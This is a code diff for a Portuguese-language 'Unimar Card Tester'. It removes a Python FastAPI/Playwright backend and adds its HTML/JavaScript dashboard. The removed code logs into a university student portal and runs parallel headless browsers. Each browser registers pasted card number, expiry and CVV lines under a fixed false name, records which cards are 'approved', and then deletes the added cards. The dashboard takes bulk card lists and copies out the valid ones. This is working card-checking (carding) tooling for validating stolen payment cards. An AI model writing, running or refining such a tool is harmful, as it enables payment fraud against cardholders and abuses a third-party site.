@@ -1,250 +1,441 @@
-import asyncio
-import os
-import random
-from contextlib import asynccontextmanager
-from pathlib import Path
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Unimar Card Tester • v6.1</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <style>
+    body { font-family: 'Inter', system-ui, sans-serif; }
+    .progress-bar { transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+    textarea { resize: none; }
+  </style>
+</head>
+<body class="bg-zinc-950 text-zinc-100 min-h-screen">
 
-import uvicorn
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
-
-from playwright.async_api import async_playwright
-
-# ===================== CONFIG =====================
-URL_LOGIN = "https://digital.unimar.br/login"
-URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"
-
-EMAIL = os.getenv("UNIMAR_EMAIL")
-SENHA = os.getenv("UNIMAR_SENHA")
-NOME_FIXO = "Bruna Mendes"
-
-# ===================== ESTADO =====================
-estado = {
-    "rodando": False,
-    "clients": set(),
-    "total_cartoes": 0,
-    "processados": 0,
-    "aprovados": 0,
-}
-
-def log(mensagem: str):
-    print(f"[LOG] {mensagem}")
-    asyncio.create_task(broadcast("log", {"mensagem": mensagem}))
-
-async def broadcast(type: str, data: dict = None):
-    if data is None:
-        data = {}
-    message = {"type": type, **data}
-    for client in list(estado["clients"]):
-        try:
-            await client.send_json(message)
-        except:
-            estado["clients"].discard(client)
-
-# ===================== LIFESPAN =====================
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    Path("aprovados.txt").touch(exist_ok=True)
-    yield
-
-app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
-
-# ===================== WEBSOCKET =====================
-@app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket):
-    await websocket.accept()
-    estado["clients"].add(websocket)
-    try:
-        while True:
-            await asyncio.sleep(10)
-    except WebSocketDisconnect:
-        estado["clients"].discard(websocket)
-
-# ===================== FUNÇÕES =====================
-async def limpar_cartoes_antigos(page):
-    try:
-        log("[Faxina] Iniciando limpeza de cartões antigos...")
-        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-        await asyncio.sleep(2)
-
-        botoes = page.get_by_role("button", name="Remover")
-        total = await botoes.count()
-
-        if total == 0:
-            log("[Faxina] Nenhum cartão antigo encontrado.")
-            return
-
-        log(f"[Faxina] {total} cartões encontrados. Removendo...")
-
-        for _ in range(total * 3):
-            if await botoes.count() == 0:
-                break
-            await botoes.first.click(force=True)
-            await asyncio.sleep(1)
-            confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
-            if await confirm.is_visible():
-                await confirm.click(force=True)
-                await page.wait_for_load_state("networkidle")
-                await asyncio.sleep(1.5)
-
-        log("[Faxina] Limpeza concluída!")
-    except Exception as e:
-        log(f"[Faxina] Erro: {e}")
-
-
-async def login_mestre(playwright):
-    try:
-        log("[Autenticação] Iniciando login mestre...")
-        browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox"])
-        context = await browser.new_context()
-        page = await context.new_page()
-
-        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
-        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
-        await page.get_by_role("textbox", name="Senha").fill(SENHA)
-        await page.get_by_role("button", name="Entrar").click()
-
-        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
-
-        # Faxina ANTES dos testes
-        await limpar_cartoes_antigos(page)
-
-        await context.storage_state(path="sessao_unimar.json")
-
-        await context.close()
-        await browser.close()
-        log("[Autenticação] Login e faxina inicial concluídos!")
-        return True
-    except Exception as e:
-        log(f"[ERRO] Login falhou: {e}")
-        return False
-
-
-async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict):
-    try:
-        await asyncio.sleep(id_worker * 2.5)
-        log(f"[Canal {id_worker}] Iniciando...")
-        context = await browser.new_context(storage_state="sessao_unimar.json")
-        page = await context.new_page()
-        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-
-        while not fila.empty() and estado["rodando"]:
-            item = await fila.get()
-            indice, linha, tentativas = item
-            try:
-                numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
-
-                await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-                await asyncio.sleep(random.uniform(1.0, 2.5))
-
-                await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
-
-                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
-                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
-                await page.get_by_label("Mês").select_option(mes)
-                await page.get_by_label("Ano").select_option(ano)
-                await page.get_by_role("textbox", name="CVV").fill(cvv)
-
-                botoes_antes = await page.get_by_role("button", name="Remover").count()
-                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
-
-                for _ in range(30):
-                    if not estado["rodando"]: break
-                    if await page.get_by_role("button", name="Remover").count() > botoes_antes:
-                        log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
-                        await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
-                        estado_fluxo["houve_aprovados"] = True
-                        break
-
-                    body = (await page.locator("body").inner_text()).lower()
-                    if any(x in body for x in ["inválida", "recusado", "erro"]):
-                        log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
-                        break
-                    await asyncio.sleep(1.5)
-            except Exception as e:
-                log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
-            finally:
-                fila.task_done()
-    finally:
-        await context.close()
-
-
-async def processar_cartoes(texto_cartoes: str, num_canais: int):
-    try:
-        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
-        linhas = list(dict.fromkeys(linhas))
-
-        estado["total_cartoes"] = len(linhas)
-        estado["processados"] = 0
-        estado["aprovados"] = 0
-
-        await broadcast("status", {"total": estado["total_cartoes"]})
-
-        fila = asyncio.Queue()
-        for idx, linha in enumerate(linhas, 1):
-            await fila.put((idx, linha, 1))
-
-        async with async_playwright() as pw:
-            if not await login_mestre(pw):
-                return
-
-            estado_fluxo = {"houve_aprovados": False}
-            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
-
-            tasks = [asyncio.create_task(worker_contexto(i, browser, fila, estado_fluxo)) for i in range(1, num_canais + 1)]
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-            # Faxina FINAL
-            if estado_fluxo["houve_aprovados"]:
-                log("[Sistema] Iniciando faxina final...")
-                try:
-                    faxina_context = await browser.new_context(storage_state="sessao_unimar.json")
-                    faxina_page = await faxina_context.new_page()
-                    await limpar_cartoes_antigos(faxina_page)
-                    await faxina_context.close()
-                except Exception as e:
-                    log(f"[Faxina Final] Erro: {e}")
-
-            await browser.close()
-
-    except Exception as e:
-        log(f"[ERRO CRÍTICO] {e}")
-    finally:
-        if os.path.exists("sessao_unimar.json"):
-            os.remove("sessao_unimar.json")
-        estado["rodando"] = False
-        await broadcast("status", {"rodando": False})
-        log("[Sistema] Processamento finalizado.")
-
-
-# ===================== ROTAS =====================
-class IniciarRequest(BaseModel):
-    lista: str
-    canais: int = 4
-
-@app.post("/api/iniciar")
-async def iniciar(data: IniciarRequest):
-    if estado["rodando"]:
-        return {"status": "já_em_execucao"}
+  <!-- HEADER -->
+  <header class="border-b border-zinc-800 bg-zinc-900 sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between gap-3">
+      <div class="flex items-center gap-2.5 min-w-0">
+        <i class="fa-solid fa-credit-card text-2xl text-blue-500 shrink-0"></i>
+        <div class="min-w-0">
+          <h1 class="text-lg font-bold tracking-tight truncate">Unimar Card Tester</h1>
+          <p class="text-xs text-zinc-500">Multi-Context Manager v6.1</p>
+        </div>
+      </div>
     
-    estado["rodando"] = True
-    await broadcast("status", {"rodando": True})
-    asyncio.create_task(processar_cartoes(data.lista, data.canais))
-    return {"status": "iniciado"}
+      <div class="flex items-center gap-2 shrink-0">
+        <div id="status-container" class="flex items-center gap-2 bg-zinc-800 px-3 py-1.5 rounded-full">
+          <div id="status-led" class="w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse"></div>
+          <span id="status-text" class="text-xs font-medium text-green-400">Online</span>
+        </div>
+      </div>
+    </div>
+  </header>
 
-@app.post("/api/parar")
-async def parar():
-    estado["rodando"] = False
-    log("⛔ Interrupção solicitada.")
-    await broadcast("status", {"rodando": False})
-    return {"status": "parando"}
+  <div class="max-w-7xl mx-auto px-4 py-5 space-y-5">
+    <div class="flex flex-col lg:flex-row gap-5 lg:gap-8">
 
-@app.get("/", response_class=HTMLResponse)
-async def index():
-    with open("templates/index.html", encoding="utf-8") as f:
-        return f.read()
+      <!-- ESQUERDA -->
+      <div class="flex-1 space-y-5">
+        <!-- PROGRESSO -->
+        <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
+          <h2 class="text-lg font-semibold mb-4 flex items-center gap-2">
+            <i class="fa-solid fa-chart-bar text-blue-500"></i>
+            Progresso do Lote
+          </h2>
+          <div class="space-y-3">
+            <div class="h-4 bg-zinc-800 rounded-full overflow-hidden">
+              <div id="progress" class="progress-bar h-full bg-gradient-to-r from-blue-500 to-indigo-600 w-[0%]"></div>
+            </div>
+            <div class="flex justify-between items-end">
+              <div class="text-3xl font-mono font-bold">
+                <span id="current">0</span>
+                <span class="text-zinc-600 text-2xl">/</span>
+                <span id="total" class="text-zinc-400">0</span>
+              </div>
+              <p id="status-text-progress" class="text-sm text-zinc-400">Aguardando início...</p>
+            </div>
+          </div>
+        </div>
 
-if __name__ == "__main__":
-    uvicorn.run("main:app", host="0.0.0.0", port=5000)
+        <!-- BOTÕES -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <button onclick="iniciarTeste()" id="btn-iniciar"
+                  class="bg-green-600 active:bg-green-700 hover:bg-green-500 transition-colors text-white font-semibold py-4 rounded-2xl text-base flex items-center justify-center gap-2.5 shadow-lg shadow-green-500/20">
+            <i class="fa-solid fa-play"></i>
+            INICIAR
+          </button>
+          <button onclick="pararTeste()" id="btn-parar"
+                  class="bg-red-600 active:bg-red-700 hover:bg-red-500 transition-colors text-white font-semibold py-4 rounded-2xl text-base flex items-center justify-center gap-2.5 shadow-lg shadow-red-500/20 hidden">
+            <i class="fa-solid fa-stop"></i>
+            INTERROMPER
+          </button>
+        </div>
+
+        <!-- LISTA DE CARTÕES -->
+        <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
+          <h2 class="text-lg font-semibold mb-3">Lista de Cartões</h2>
+          <textarea id="lista-cartoes" rows="8"
+            class="w-full bg-zinc-950 border border-zinc-700 rounded-xl p-4 font-mono text-sm focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
+            placeholder="Cole aqui no formato:&#10;4111111111111111|12|2028|123"></textarea>
+        </div>
+      </div>
+
+      <!-- DIREITA -->
+      <div class="w-full lg:w-96 space-y-5">
+        <!-- APROVADOS + REPROVADOS -->
+        <div class="grid grid-cols-2 gap-3">
+          <div class="bg-gradient-to-br from-green-600 to-emerald-600 rounded-2xl p-4 text-center">
+            <h2 class="text-green-100 text-xs font-medium tracking-wide">APROVADOS</h2>
+            <div id="approved-count" class="text-4xl font-bold mt-1 mb-0.5">0</div>
+            <p class="text-green-100/70 text-xs">cartões</p>
+          </div>
+          <div class="bg-gradient-to-br from-red-600 to-rose-600 rounded-2xl p-4 text-center">
+            <h2 class="text-red-100 text-xs font-medium tracking-wide">REPROVADOS</h2>
+            <div id="rejected-count" class="text-4xl font-bold mt-1 mb-0.5">0</div>
+            <p class="text-red-100/70 text-xs">cartões</p>
+          </div>
+        </div>
+
+        <!-- INSTÂNCIAS PARALELAS -->
+        <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
+          <h2 class="text-base font-semibold mb-4 flex items-center gap-2">
+            <i class="fa-solid fa-layer-group text-blue-500"></i>
+            Instâncias Paralelas
+          </h2>
+          <div class="grid grid-cols-3 gap-2.5" id="canais-buttons"></div>
+          <input type="hidden" id="canais" value="4">
+          <p class="text-xs text-zinc-500 mt-3 text-center">Quantidade de canais simultâneos</p>
+        </div>
+
+        <!-- LISTA DE APROVADOS -->
+        <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
+          <div class="flex justify-between items-center mb-3">
+            <h2 class="text-base font-semibold">Cartões Aprovados</h2>
+            <button onclick="copiarAprovados()"
+                    class="text-xs bg-green-600 active:bg-green-700 hover:bg-green-500 px-3 py-1.5 rounded-lg flex items-center gap-1.5 transition">
+              <i class="fa-regular fa-copy"></i>
+              <span>Copiar</span>
+            </button>
+          </div>
+          <div id="approved-list" class="space-y-2 max-h-40 overflow-y-auto font-mono text-xs text-green-300">
+            <p class="text-zinc-500 text-center py-4">Nenhum aprovado ainda</p>
+          </div>
+        </div>
+
+        <!-- HISTÓRICO -->
+        <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800 flex flex-col" style="height: 280px;">
+          <div class="flex justify-between items-center mb-3">
+            <h2 class="text-base font-semibold">Histórico de Eventos</h2>
+            <button onclick="limparLogs()"
+                    class="text-zinc-400 active:text-white hover:text-white transition-colors text-sm flex items-center gap-1">
+              <i class="fa-solid fa-trash"></i>
+            </button>
+          </div>
+          <div id="history" class="flex-1 overflow-y-auto space-y-2.5 text-sm"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL -->
+  <div id="modal-fim" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md items-center justify-center z-50 p-4">
+    <div class="bg-zinc-900 border border-zinc-700 rounded-2xl p-6 w-full max-w-sm text-center">
+      <i class="fa-solid fa-circle-check text-5xl text-emerald-500 mb-5"></i>
+      <h3 class="text-xl font-bold mb-2">Processamento Concluído</h3>
+      <p class="text-zinc-400 mb-6 text-sm">Todos os cartões foram processados.</p>
+      <button onclick="fecharModal()" class="w-full py-3.5 bg-blue-600 active:bg-blue-700 hover:bg-blue-500 rounded-xl font-semibold transition">
+        Fechar
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // ==================== ESTADO ====================
+    let socket = null;
+    let testeIniciado = false;
+    let totalCartoes = 0;
+    let processados = 0;
+    let aprovados = 0;
+    let reprovados = 0;
+    let listaAprovados = [];
+    
+    // Controle de performance
+    let reconnectAttempts = 0;
+    let progressUpdatePending = false;
+    let lastProgressUpdate = 0;
+    const MAX_HISTORY = 120;          // Limite de mensagens no histórico
+    const PROGRESS_THROTTLE = 80;     // ms entre atualizações de progresso
+
+    // ==================== BOTÕES DE CANAIS ====================
+    function criarBotoesCanais() {
+      const container = document.getElementById('canais-buttons');
+      container.innerHTML = '';
+      const selected = parseInt(document.getElementById('canais').value);
+      
+      for (let i = 1; i <= 6; i++) {
+        const btn = document.createElement('button');
+        btn.className = `rounded-xl py-3.5 text-center transition-all active:scale-95 ${
+          i === selected
+            ? 'bg-blue-600 text-white shadow-lg shadow-blue-500/40'
+            : 'bg-zinc-800 active:bg-zinc-700 text-zinc-300'
+        }`;
+        btn.innerHTML = `
+          <div class="text-2xl font-bold leading-none">${i}</div>
+          <div class="text-[11px] mt-1 opacity-70">canais</div>
+        `;
+        btn.onclick = () => {
+          document.getElementById('canais').value = i;
+          criarBotoesCanais();
+        };
+        container.appendChild(btn);
+      }
+    }
+
+    // ==================== WEBSOCKET OTIMIZADO ====================
+    function conectarWebSocket() {
+      // Evita múltiplas conexões
+      if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+        return;
+      }
+
+      try {
+        socket = new WebSocket(`wss://${window.location.host}/ws`);
+      } catch (err) {
+        console.error('Erro ao criar WebSocket:', err);
+        agendarReconexao();
+        return;
+      }
+
+      socket.onopen = () => {
+        reconnectAttempts = 0;
+        document.getElementById('status-text').textContent = "Online";
+        document.getElementById('status-led').className = "w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse";
+      };
+
+      socket.onmessage = (event) => {
+        let data;
+        try {
+          data = JSON.parse(event.data);
+        } catch (e) {
+          return; // ignora mensagens inválidas
+        }
+
+        switch (data.type) {
+          case "log":
+            handleLog(data.mensagem);
+            break;
+          case "aprovado":
+            handleAprovado(data.cartao);
+            break;
+          case "status":
+            if (data.rodando === false && testeIniciado && processados > 0) {
+              mostrarModalFinal();
+            }
+            break;
+        }
+      };
+
+      socket.onclose = () => {
+        document.getElementById('status-text').textContent = "Reconectando...";
+        document.getElementById('status-led').className = "w-2.5 h-2.5 bg-yellow-500 rounded-full animate-pulse";
+        agendarReconexao();
+      };
+
+      socket.onerror = () => {
+        // onclose será chamado logo em seguida
+      };
+    }
+
+    function agendarReconexao() {
+      reconnectAttempts++;
+      // Backoff exponencial: 1s, 2s, 4s, 8s... máximo 15s
+      const delay = Math.min(1000 * Math.pow(2, reconnectAttempts - 1), 15000);
+      setTimeout(conectarWebSocket, delay);
+    }
+
+    // ==================== HANDLERS OTIMIZADOS ====================
+    function handleLog(mensagem) {
+      adicionarHistorico(mensagem);
+
+      const isAprovado = mensagem.includes("APROVADO") || mensagem.includes("✅");
+      const isReprovado = mensagem.includes("Reprovado") || mensagem.includes("REPROVADO") || mensagem.includes("❌");
+
+      if (isAprovado || isReprovado) {
+        processados++;
+        
+        if (isReprovado) {
+          reprovados++;
+          // Atualiza contador de reprovados imediatamente (é leve)
+          document.getElementById('rejected-count').textContent = reprovados;
+        }
+        
+        // Throttle da atualização de progresso
+        scheduleProgressUpdate();
+      }
+    }
+
+    function handleAprovado(cartao) {
+      if (listaAprovados.includes(cartao)) return;
+      
+      listaAprovados.push(cartao);
+      aprovados++;
+      document.getElementById('approved-count').textContent = aprovados;
+      adicionarAprovadoDOM(cartao);
+    }
+
+    // ==================== DOM OTIMIZADO ====================
+    function adicionarHistorico(mensagem) {
+      const history = document.getElementById('history');
+      
+      // Limita o tamanho do histórico (remove as mais antigas)
+      while (history.children.length >= MAX_HISTORY) {
+        history.removeChild(history.lastChild);
+      }
+
+      let cor = "text-zinc-400";
+      if (mensagem.includes("APROVADO") || mensagem.includes("✅")) cor = "text-green-400";
+      else if (mensagem.includes("Reprovado") || mensagem.includes("❌")) cor = "text-red-400";
+      else if (mensagem.includes("Faxina") || mensagem.includes("Sistema")) cor = "text-blue-400";
+
+      const entry = document.createElement('div');
+      entry.className = `flex gap-2.5 ${cor}`;
+      entry.innerHTML = `
+        <i class="fa-solid fa-circle text-[5px] mt-1.5 opacity-60 shrink-0"></i>
+        <div class="min-w-0">
+          <span class="break-all text-[13px] leading-snug">${mensagem}</span>
+        </div>
+      `;
+      
+      // Prepend é mais caro, mas necessário para mostrar o mais recente no topo
+      history.insertBefore(entry, history.firstChild);
+    }
+
+    function adicionarAprovadoDOM(cartao) {
+      const container = document.getElementById('approved-list');
+     
+      // Remove placeholder se existir
+      const placeholder = container.querySelector('p');
+      if (placeholder) placeholder.remove();
+
+      const div = document.createElement('div');
+      div.className = "bg-green-900/30 border border-green-700/50 rounded-lg p-2.5 break-all";
+      div.textContent = cartao;
+      container.appendChild(div);
+    }
+
+    function scheduleProgressUpdate() {
+      if (progressUpdatePending) return;
+      
+      const now = performance.now();
+      const timeSinceLast = now - lastProgressUpdate;
+
+      if (timeSinceLast >= PROGRESS_THROTTLE) {
+        atualizarProgresso();
+        lastProgressUpdate = now;
+      } else {
+        progressUpdatePending = true;
+        setTimeout(() => {
+          atualizarProgresso();
+          lastProgressUpdate = performance.now();
+          progressUpdatePending = false;
+        }, PROGRESS_THROTTLE - timeSinceLast);
+      }
+    }
+
+    function atualizarProgresso() {
+      if (totalCartoes <= 0) return;
+      
+      const percent = Math.min(Math.round((processados / totalCartoes) * 100), 100);
+     
+      document.getElementById('progress').style.width = percent + '%';
+      document.getElementById('current').textContent = processados;
+      document.getElementById('total').textContent = totalCartoes;
+      document.getElementById('status-text-progress').textContent =
+        percent >= 100 ? "Finalizado!" : "Processando...";
+    }
+
+    // ==================== AÇÕES ====================
+    function copiarAprovados() {
+      if (listaAprovados.length === 0) {
+        alert("Nenhum cartão aprovado para copiar.");
+        return;
+      }
+      navigator.clipboard.writeText(listaAprovados.join('\n')).then(() => {
+        alert("Aprovados copiados com sucesso!");
+      });
+    }
+
+    function limparLogs() {
+      document.getElementById('history').innerHTML = '';
+    }
+
+    function iniciarTeste() {
+      const lista = document.getElementById('lista-cartoes').value.trim();
+      if (!lista) return alert("Insira a lista de cartões!");
+      
+      totalCartoes = lista.split('\n').filter(l => l.trim()).length;
+      processados = 0;
+      aprovados = 0;
+      reprovados = 0;
+      listaAprovados = [];
+      
+      document.getElementById('approved-count').textContent = '0';
+      document.getElementById('rejected-count').textContent = '0';
+      document.getElementById('approved-list').innerHTML = '<p class="text-zinc-500 text-center py-4">Nenhum aprovado ainda</p>';
+      document.getElementById('progress').style.width = '0%';
+      document.getElementById('current').textContent = '0';
+      document.getElementById('total').textContent = totalCartoes;
+      document.getElementById('status-text-progress').textContent = "Iniciando...";
+      document.getElementById('history').innerHTML = '';
+      
+      fetch('/api/iniciar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          lista: lista,
+          canais: parseInt(document.getElementById('canais').value)
+        })
+      });
+      
+      testeIniciado = true;
+      document.getElementById('btn-iniciar').classList.add('hidden');
+      document.getElementById('btn-parar').classList.remove('hidden');
+    }
+
+    function pararTeste() {
+      fetch('/api/parar', { method: 'POST' });
+    }
+
+    function mostrarModalFinal() {
+      document.getElementById('modal-fim').classList.remove('hidden');
+      document.getElementById('modal-fim').classList.add('flex');
+    }
+
+    function fecharModal() {
+      document.getElementById('modal-fim').classList.add('hidden');
+      document.getElementById('modal-fim').classList.remove('flex');
+     
+      testeIniciado = false;
+      document.getElementById('btn-iniciar').classList.remove('hidden');
+      document.getElementById('btn-parar').classList.add('hidden');
+    }
+
+    // ==================== INIT ====================
+    window.onload = () => {
+      criarBotoesCanais();
+      conectarWebSocket();
+    };
+
+    // Cleanup ao sair da página
+    window.addEventListener('beforeunload', () => {
+      if (socket) {
+        socket.onclose = null; // evita reconexão
+        socket.close();
+      }
+    });
+  </script>
+</body>
+</html>
